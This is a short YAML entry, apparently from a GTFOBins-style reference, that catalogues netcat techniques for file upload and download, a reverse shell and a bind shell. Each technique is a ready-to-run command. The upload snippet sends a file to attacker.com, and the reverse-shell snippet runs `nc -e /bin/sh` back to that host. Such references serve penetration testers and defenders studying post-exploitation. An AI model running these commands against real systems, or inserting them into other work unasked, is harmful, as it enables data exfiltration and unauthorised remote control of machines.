---
functions:
  upload:
    - description: |
        Send a file to a TCP port. Run `nc -l -p 12345 > "where_to_save"` to collect the file on the other end.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        nc $RHOST $RPORT < "$LFILE"
  download:
    - description: Fetch remote file from a remote TCP port. Run `nc target.com 12345 < "file_to_send"` to send the file from the other end.
      code: |-
        LPORT=12345
        LFILE=where_to_save
        nc -l -p $LPORT > "$LFILE"
  reverse-shell:
    - description: Run `nc -l -p 12345` to receive the shell on the other end.
      code: |
        RHOST=attacker.com
        RPORT=12345
        nc -e /bin/sh $RHOST $RPORT
  bind-shell:
    - description: Run `nc target.com 12345` to connect to the shell on the other end.
      code: |
        LPORT=12345
        nc -l -p $LPORT -e /bin/sh
---
